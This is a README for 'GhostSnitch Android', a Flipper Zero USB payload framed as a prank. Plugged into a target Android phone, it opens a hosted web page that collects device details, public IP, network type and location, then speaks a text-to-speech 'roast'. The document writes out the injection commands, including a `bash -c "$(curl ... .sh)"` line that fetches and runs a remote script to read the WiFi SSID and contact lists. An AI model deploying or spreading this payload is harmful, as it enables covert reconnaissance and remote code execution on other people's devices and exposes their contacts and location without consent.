# 🤖 GhostSnitch Android

GhostSnitch adapted for Android - **now works WITHOUT Termux!** Executes roast-style recon using device info, TTS, and optional contact scans.

## 🧠 Features
- **Universal compatibility**: Works on ANY Android device with Chrome (pre-installed on most)
- **No Termux required**: Uses Web APIs for device info and TTS (Web Speech API)
- **Automatic execution**: Opens Chrome and executes script automatically
- **Device reconnaissance**: Collects device brand, model, and Android version
- **System information**: Reads public IP, RAM info, network connection type
- **Location detection**: Optional geolocation (if permissions granted)
- **Text-to-speech roast**: Delivers roast using Web Speech API (no special apps needed)
- **Enhanced mode**: Optional Termux support for additional features (WiFi SSID, contacts)
- **Robust error handling**: Gracefully handles missing APIs and network issues

## 🚀 How to Use

### Prerequisites
**Minimum Requirements (Web Mode - Works on ALL devices):**
- Android device with Chrome browser (pre-installed on most devices)
- Network connectivity (for script download and IP detection)

**Enhanced Mode (Optional - Requires Termux):**
- Termux installed on the target Android device
- Termux API (`termux-api` package) for enhanced features:
  ```bash
  pkg install termux-api
  ```
- Grant necessary permissions to Termux (storage, contacts, etc.) if prompted

### Execution
1. Load `GhostSnitch_Android.txt` onto your Flipper Zero
2. Connect Flipper Zero to target Android device via USB
3. Run the payload - it will:
   - **Primary method**: Open Chrome and execute web-based script (works on all devices)
   - **Fallback method**: Launch Termux if available (for enhanced features)
   - Deliver the roast via text-to-speech

### How It Works

**Primary Method (Web-based - Universal):**
The payload opens Chrome with a hosted HTML page that uses:
- **Web Speech API** for text-to-speech (no special apps needed)
- **Navigator API** for device information (brand, platform, RAM)
- **Network Information API** for connection details
- **Geolocation API** for location (optional, requires permission)
- **Fetch API** for IP detection

```bash
am start -a android.intent.action.VIEW -d "https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.html"
```

**Enhanced Method (Termux - Optional):**
If Termux is installed, the payload also attempts to execute the Termux script for additional features:
- WiFi SSID detection (via `termux-wifi-connectioninfo`)
- Contact scanning (via `termux-contact-list`)
- Enhanced system information

```bash
am start -n com.termux/.HomeActivity
bash -c "$(curl -fsSL https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.sh)"
```

## ✨ What's New in v3.0

- **No Termux dependency**: Works on any Android device with Chrome
- **Web-based execution**: Uses Web APIs for universal compatibility
- **Dual-mode operation**: Web mode (universal) + Termux mode (enhanced features)
- **Better device detection**: Uses Navigator API for accurate device info
- **Network information**: Detects connection type and speed
- **Location support**: Optional geolocation detection
- **Improved reliability**: Multiple fallback methods ensure execution

## ⚠️ Limitations
- **Network connectivity required** for IP detection and script download
- Enhanced features (WiFi SSID, contacts) require Termux + Termux API
- Location detection requires user permission (may be blocked)
- Some older Android versions may have limited Web API support

## 🔧 Version
**v3.0** - Universal Android support via Web APIs, no Termux required!

## 🙏 Credits
Based on the original GhostSnitch prank for Windows. Reimagined for Android by **TBJr**
